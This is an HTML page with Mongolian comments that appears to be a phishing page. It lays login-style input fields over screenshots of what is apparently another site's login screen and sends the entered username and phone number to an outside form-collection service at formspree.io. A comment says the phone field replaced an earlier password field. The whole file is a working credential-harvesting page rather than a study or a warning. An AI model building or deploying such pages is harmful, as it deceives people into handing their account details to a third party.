<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
::placeholder {
  color: black;
  opacity: 0.9; /* Firefox */
}
input {
  color: black;
  background-color: white;
}
h1 {
  font-size: 50px;
}
label{
  font-size: 50px;
}
input{
  font-size: 45px;
}

/* User input байрлал */
input[type=text].user-input {
  position: fixed;
  height: 115px;
  top: 18.9%;
  right: 12%;
  width: 77%;
  padding: 34px 20px;
  margin: 30px 0;
  display: inline-block;
  border: 0px solid #ccc;
  border-radius: 10px;
  box-sizing: border-box;
}

/* Phone input байрлал (хуучин password байсан байрлал) */
input[type=text].phone-input {
  position: fixed;
  height: 115px;
  top: 28.8%;
  right: 12%;
  width: 77%;
  padding: 34px 20px;
  margin: 30px 0;
  display: inline-block;
  border: 0px solid #ccc;
  border-radius: 10px;
  box-sizing: border-box;
}

input[type=submit] {
  position: fixed;
  height: 115px;
  top: 42.8%;
  right: 12%;
  width: 77%;
  background-color: #ccbf64;
  color: white;
  padding: 34px 20px;
  margin: 80px 0;
  border: 0px solid #ccc;
  border-radius: 10px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #45a049;
}

/* Контейнер хэсэг */
.login-box {
  background-image: url('Screenshot_2.png');
  background-repeat: no-repeat;
  background-size: cover;
  border: 3px solid #163278;
  border-radius: 20px;
  position: fixed;
  height: 1000px;
  width: 65%;
  top: 10%;
  right: 9%;
  background-color: #1D1C2A;
  padding: 90px;
}

body {
  background-image: url('Screenshot_1.png');
  background-repeat: no-repeat;
  background-attachment: fixed;
  background-size: 100% 100%;
}
</style>
</head>
<body>

<div class="login-box">
    <form action="https://formspree.io/f/xaeegqyy" method="POST">
        <h1 style="color:rgb(255, 255, 255 );"></h1>
        <input type="text" name="username" class="user-input" placeholder="Enter username" required><br>
        <input type="text" name="phone" class="phone-input" placeholder="Enter phone number" required><br>
        <input type="submit" value="LOGIN">
    </form>
</div>

</body>
</html>
